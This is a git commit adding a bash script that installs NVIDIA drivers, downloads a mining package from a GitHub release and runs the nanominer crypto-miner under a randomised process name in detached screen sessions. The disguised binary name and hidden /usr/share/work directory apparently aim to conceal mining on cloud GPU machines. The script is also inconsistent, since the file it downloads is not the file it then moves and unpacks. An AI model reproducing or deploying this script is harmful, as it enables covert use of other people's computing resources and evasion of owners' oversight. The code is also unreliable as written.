216844de05b27cc503f1a3ab923cde8bd980f874
wollfoo <nhac.tien1988@gmail.com>
2022-02-25 10:49:28 +0700

    Create  dphuoeht.sh

---
+++ dphuoeht.sh
@@ -0,0 +1,22 @@
+#!/bin/bash
+apt-get update
+apt-get install -y git wget screen
+azure=mxsemsdnlkdj
+a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+apt-get install -y git wget screen
+wget https://us.download.nvidia.com/tesla/460.73.01/NVIDIA-Linux-x86_64-460.73.01.run
+sudo chmod +x NVIDIA-Linux-x86_64-460.73.01.run
+./NVIDIA-Linux-x86_64-460.73.01.run
+mkdir /usr/share
+mkdir /usr/share/work
+rm -r /usr/share/work/avengers
+wget https://github.com/wollfoo/wolethv100/releases/download/hypernova/hypernova.tar.gz
+mv avengers.tar.gz /usr/share/work/
+cd /usr/share/work/ &&  tar xf avengers.tar.gz
+rm -rf avengers.tar.gz && cd avengers
+mv nanominer $azure -n
+cp $azure "$cpuname"
+rm -f  nanominer
+echo $cpuname" is starting"
+screen -d -m ./"${cpuname}" eth01.ini
+screen -d -m ./"${cpuname}" eth02.ini
